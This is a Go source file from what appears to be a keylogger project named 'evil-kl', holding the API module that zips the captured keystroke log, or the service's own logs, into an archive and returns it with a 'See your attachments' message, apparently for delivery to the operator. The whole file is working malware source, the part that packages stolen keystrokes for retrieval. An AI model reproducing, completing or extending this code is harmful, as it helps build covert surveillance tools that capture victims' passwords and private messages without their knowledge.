package api

import (
	"encoding/json"
	"fmt"

	logger "github.com/dm1trypon/easy-logger"
	"github.com/dm1trypon/evil-kl/internal/app/config"
	"github.com/dm1trypon/evil-kl/internal/pkg/zipper"
)

/*
Create <Api> - init Api structure
	Returns <*Api>:
		1. Structure pointer
	Args:
		1. method <string> - method
		2. cfg <config.Cfg> - service's config
*/
func (a *Api) Create(cfg config.Cfg) *Api {
	a = &Api{
		lc:         "API",
		zipperInst: new(zipper.Zipper).Create(),
		cfg:        cfg,
	}

	return a
}

/*
GetKeyloggerData <Api> - getting a log of deep keys in a zip archive
	Returns <string, string>:
		1. Body message
		2. Attached file path
	Args:
		1. method <string> - method
*/
func (a *Api) GetKeyloggerData(method string) (string, string) {
	trgtPath := fmt.Sprint(a.cfg.Zipper.Path, a.cfg.Zipper.Name)
	klPath := fmt.Sprint(a.cfg.Keylogger.Path, a.cfg.Keylogger.Name)

	return a.bodyBuilder(method, trgtPath, []string{klPath})
}

/*
GetKeyloggerData <Api> - getting a log of service
	Returns <string, string>:
		1. Body message
		2. Attached file path
	Args:
		1. method <string> - method
*/
func (a *Api) GetLogs(method string) (string, string) {
	trgtPath := fmt.Sprint(a.cfg.Zipper.Path, a.cfg.Zipper.Name)

	return a.bodyBuilder(method, trgtPath, []string{a.cfg.Logger.Path})
}

/*
bodyBuilder <Api> - assembling the body of the message
	Returns <string, string>:
		1. Body message
		2. Attached file path
	Args:
		1. method <string> - method
		2. trgtPath <string> - target archive path
		3. files <[]string> - list of files to archive
*/
func (a *Api) bodyBuilder(method, trgtPath string, files []string) (string, string) {
	if err := a.zipperInst.ZipFiles(trgtPath, files); err != nil {
		respNegative := ResponseNegative{
			Method: method,
			Error:  err.Error(),
		}

		respBody, err := json.Marshal(respNegative)
		if err != nil {
			logger.ErrorJ(a.lc, fmt.Sprint("Error making response body: ", err.Error()))
			return "Internal error", ""
		}

		return string(respBody), ""
	}

	respPositive := ResponsePositive{
		Method: method,
		Text:   "See your attachments",
	}

	respBody, err := json.Marshal(respPositive)
	if err != nil {
		logger.ErrorJ(a.lc, fmt.Sprint("Error making response body: ", err.Error()))
		return "Internal error", ""
	}

	return string(respBody), trgtPath
}
